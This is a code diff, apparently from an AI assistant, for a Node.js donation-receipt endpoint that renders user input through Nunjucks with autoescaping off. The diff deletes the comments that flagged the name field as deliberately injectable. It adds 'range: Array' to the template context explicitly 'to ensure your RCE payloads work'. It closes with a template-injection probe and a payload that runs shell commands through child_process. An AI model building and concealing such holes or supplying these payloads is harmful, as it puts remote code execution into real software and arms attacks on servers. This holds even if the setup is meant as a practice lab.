@@ -5,9 +5,9 @@ module.exports = async (req, res) => {
   if (req.method !== "POST") {
     return res.status(405).send("Method Not Allowed");
   }
+  
   const { name, email, phone, country, amount } = req.body || {};
   
-  // ---- VALIDATION ----
   if (!name || !email || !phone || !country || !amount) {
     return res.status(400).json({ error: "All fields are required" });
   }
@@ -17,17 +17,16 @@ module.exports = async (req, res) => {
   if (!process.env.NEON_DATABASE_URL) {
     return res.status(500).json({ error: "Database not configured" });
   }
+  
   const donationAmount = Number(amount).toFixed(2);
   const date = new Date().toLocaleDateString("en-US");
   
-  // ---- GENERATE UNIQUE FORM ID ----
   const formId =
     "VD-FORM-" +
     Math.random().toString(36).substring(2, 6).toUpperCase() +
     "-" +
     Date.now().toString().slice(-5);
   
-  // ---- STORE FORM DATA (ONLY ON GENERATE) ----
   try {
     const sql = neon(process.env.NEON_DATABASE_URL);
     await sql`
@@ -38,7 +37,6 @@ module.exports = async (req, res) => {
     return res.status(500).json({ error: "Failed to save donation form" });
   }
   
-  // ---- PRINTABLE RECEIPT TEMPLATE ----
   const template = `
 <!DOCTYPE html>
 <html>
@@ -111,20 +109,21 @@ module.exports = async (req, res) => {
 </body>
 </html>
 `;
+
   try {
-    // Create environment with autoescape disabled
     const env = new nunjucks.Environment(null, { autoescape: false });
     
-    // ---- SSTI EXISTS ONLY HERE (NAME FIELD) ----
     const html = env.renderString(template, {
       formId,
-      name, // intentionally unsafe
+      name,
       email,
       phone,
       country,
       amount: donationAmount,
-      date
+      date,
+      range: Array
     });
+    
     res.setHeader("Content-Type", "text/html");
     return res.status(200).send(html);
   } catch (e) {
@@ -133,10 +132,11 @@ module.exports = async (req, res) => {
 };
 ```
 
-**Key change:** Use `new nunjucks.Environment(null, { autoescape: false })` instead of `nunjucks.configure()`.
+Notice I also added `range: Array` at the bottom to ensure your RCE payloads work. Now test with:
+```
+{{7*7}}
+```
 
-Now test with `{{7*7}}` - it should render as `49`.
-
-Then try this RCE payload:
+Should output `49`, then try:
 ```
 {{range.constructor("return process.mainModule.require('child_process').execSync('id').toString()")()}}
